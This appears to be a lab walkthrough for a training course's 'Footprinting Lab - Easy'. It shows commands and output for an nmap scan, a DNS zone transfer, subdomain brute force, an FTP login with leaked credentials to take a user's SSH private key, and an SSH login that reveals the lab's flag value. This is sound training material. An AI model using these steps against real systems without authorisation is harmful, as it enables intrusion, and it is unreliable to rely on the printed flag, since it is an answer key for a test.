
---

We were commissioned by the company `Inlanefreight Ltd` to test three different servers in their internal network. The company uses many different services, and the IT security department felt that a penetration test was necessary to gain insight into their overall security posture.

The first server is an internal DNS server that needs to be investigated. In particular, our client wants to know what information we can get out of these services and how this information could be used against its infrastructure. Our goal is to gather as much information as possible about the server and find ways to use that information against the company. However, our client has made it clear that it is forbidden to attack the services aggressively using exploits, as these services are in production.

Additionally, our teammates have found the following credentials "ceil:qwer1234", and they pointed out that some of the company's employees were talking about SSH keys on a forum.

The administrators have stored a `flag.txt` file on this server to track our progress and measure success. Fully enumerate the target and submit the contents of this file as proof.

---

# Footprinting Lab - Easy

## Question 1

### "Enumerate the server carefully and find the flag.txt file. Then, submit the contents of this file as the answer."

After spawning the target machine, students need to launch an `Nmap` scan against it:

Code: shell

```shell
nmap -A 10.129.141.200
```

  Footprinting Lab - Easy

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-tl1xuueppb]─[~]
└──╼ [★]$ nmap -A 10.129.141.200

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-28 13:36 GMT
Nmap scan report for 10.129.141.200
Host is up (0.046s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (ftp.int.inlanefreight.htb) [10.129.141.200]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
2121/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (Ceil's FTP) [10.129.141.200]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
```

Students will notice that there is a DNS server running, therefore, they need to attempt a zone transfer with `dig`:

Code: shell

```shell
dig AXFR inlanefreight.htb @STMIP
```

  Footprinting Lab - Easy

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-xx24xxdnig]─[~]
└──╼ [★]$ dig AXFR inlanefreight.htb @10.129.85.254

; <<>> DiG 9.16.27-Debian <<>> AXFR inlanefreight.htb @10.129.85.254
;; global options: +cmd
inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
inlanefreight.htb.	604800	IN	TXT	"MS=ms97310371"
inlanefreight.htb.	604800	IN	TXT	"atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU"
inlanefreight.htb.	604800	IN	TXT	"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all"
inlanefreight.htb.	604800	IN	NS	ns.inlanefreight.htb.
app.inlanefreight.htb.	604800	IN	A	10.129.18.15
internal.inlanefreight.htb. 604800 IN	A	10.129.1.6
mail1.inlanefreight.htb. 604800	IN	A	10.129.18.201
ns.inlanefreight.htb.	604800	IN	A	10.129.34.136
inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
;; Query time: 10 msec
;; SERVER: 10.129.85.254#53(10.129.85.254)
;; WHEN: Mon Nov 28 10:25:21 GMT 2022
;; XFR size: 10 records (messages 1, bytes 540)
```

The one that stands out is `internal.inlanefreight.htb`, therefore, students need to add it to `/etc/hosts`:

Code: shell

```shell
sudo sh -c 'echo "STMIP internal.inlanefreight.htb" >> /etc/hosts'
```

  Footprinting Lab - Easy

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-xx24xxdnig]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.85.254 internal.inlanefreight.htb" >> /etc/hosts'
```

Subsequently, students need to run `dnsenum` on `internal.inlanefreight.htb`, finding the subdomain `ftp.internal.inlanefreight.htb`:

Code: shell

```shell
dnsenum --dnsserver STMIP --enum -p 0 -s 0 -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt internal.inlanefreight.htb
```

  Footprinting Lab - Easy

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-xx24xxdnig]─[~]
└──╼ [★]$ dnsenum --dnsserver 10.129.85.254 --enum -p 0 -s 0 -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt internal.inlanefreight.htb
dnsenum VERSION:1.2.6

-----   internal.inlanefreight.htb   -----

Host's addresses:
__________________

Name Servers:
______________

ns.inlanefreight.htb.   604800   IN    A   10.129.34.136

Mail (MX) Servers:
___________________

Trying Zone Transfers and getting Bind Versions:
_________________________________________________

unresolvable name: ns.inlanefreight.htb at /usr/bin/dnsenum line 900 thread 2.

Trying Zone Transfer for internal.inlanefreight.htb on ns.inlanefreight.htb ... 
AXFR record query failed: no nameservers


Brute forcing with /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:
_______________________________________________________________________________________

ftp.internal.inlanefreight.htb.          604800   IN    A         127.0.0.1
ns.internal.inlanefreight.htb.           604800   IN    A        10.129.34.13
<SNIP>
```

Thus, students need to add `ftp.internal.inlanefreight.htb` to `/etc/hosts` and then launch an `Nmap` scan against it:

Code: shell

```shell
sudo sh -c 'echo "STMIP ftp.internal.inlanefreight.htb" >> /etc/hosts'
nmap -T4 ftp.internal.inlanefreight.htb
```

  Footprinting Lab - Easy

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-xx24xxdnig]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.85.254 ftp.internal.inlanefreight.htb" >> /etc/hosts'
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-xx24xxdnig]─[~/ipmiPwner]
└──╼ [★]$ nmap -T4 ftp.internal.inlanefreight.htb

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-28 10:32 GMT
Nmap scan report for ftp.internal.inlanefreight.htb (10.129.85.254)
Host is up (0.067s latency).
rDNS record for 10.129.85.254: internal.inlanefreight.htb
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
53/tcp   open  domain
2121/tcp open  ccproxy-ftp
```

From the output of `Nmap`, students will know that there is a FTP protocol/service running on a `CCProxy` server utilizing port 2121.

Students need to recall the details written in the assessment's lab scenario. Specifically, that the credentials `ceil:qwer1234` had already been discovered. Therefore, students need to utilize them to connect to the FTP service on port 2121:

Code: shell

```shell
ftp ftp.internal.inlanefreight.htb 2121
```

  Footprinting Lab - Easy

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-xx24xxdnig]─[~/ipmiPwner]
└──╼ [★]$ ftp ftp.internal.inlanefreight.htb 2121

Connected to ftp.internal.inlanefreight.htb.
220 ProFTPD Server (Ceil's FTP) [10.129.85.254]
Name (ftp.internal.inlanefreight.htb:root): ceil
331 Password required for ceil
Password:
230 User ceil logged in
Remote system type is UNIX.
Using binary mode to transfer files.
```

When listing the hidden contents of the directory, students will find a `.ssh` folder, which contains within it an SSH private key named `id_rsa`, therefore, students need to use `get` to download it:

Code: shell

```shell
ls -al
ls .ssh/
cd .ssh
get id_rsa
```

  Footprinting Lab - Easy

```shell-session
ftp> ls -al

200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   4 ceil     ceil         4096 Nov 10  2021 .
drwxr-xr-x   4 ceil     ceil         4096 Nov 10  2021 ..
-rw-------   1 ceil     ceil          294 Nov 10  2021 .bash_history
-rw-r--r--   1 ceil     ceil          220 Nov 10  2021 .bash_logout
-rw-r--r--   1 ceil     ceil         3771 Nov 10  2021 .bashrc
drwx------   2 ceil     ceil         4096 Nov 10  2021 .cache
-rw-r--r--   1 ceil     ceil          807 Nov 10  2021 .profile
drwx------   2 ceil     ceil         4096 Nov 10  2021 .ssh
-rw-------   1 ceil     ceil          759 Nov 10  2021 .viminfo
226 Transfer complete
ftp> ls .ssh/
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-rw-r--   1 ceil     ceil          738 Nov 10  2021 authorized_keys
-rw-------   1 ceil     ceil         3381 Nov 10  2021 id_rsa
-rw-r--r--   1 ceil     ceil          738 Nov 10  2021 id_rsa.pub
ftp> cd .ssh
250 CWD command successful
ftp> get id_rsa
local: id_rsa remote: id_rsa
200 PORT command successful
150 Opening BINARY mode data connection for id_rsa (3381 bytes)
226 Transfer complete
3381 bytes received in 0.00 secs (2.6408 MB/s)
```

Subsequently, students need to set the permissions `600` to the private key before using it:

Code: shell

```shell
chmod 600 id_rsa
```

  Footprinting Lab - Easy

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-xx24xxdnig]─[~/ipmiPwner]
└──╼ [★]$ chmod 600 id_rsa
```

At last, students need to use the private key to connect to the SSH service on the spawned target machine as the user `ceil` and print out the flag file at `/home/flag/flag.txt` to attain `HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}`:

Code: shell

```shell
ssh -i id_rsa ceil@STMIP
cat /home/flag/flag.txt
```

  Footprinting Lab - Easy

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-xx24xxdnig]─[~/ipmiPwner]
└──╼ [★]$ ssh -i id_rsa ceil@10.129.85.254

The authenticity of host '10.129.85.254 (10.129.85.254)' can't be established.
ECDSA key fingerprint is SHA256:AelxWP/kQK76SQAaNbbaRFJ8vSmDBr/XB8/66aPreGs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? Yes
Warning: Permanently added '10.129.85.254' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-90-generic x86_64)
<SNIP>

ceil@NIXEASY:~$ cat /home/flag/flag.txt
HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}
```

Answer: {hidden}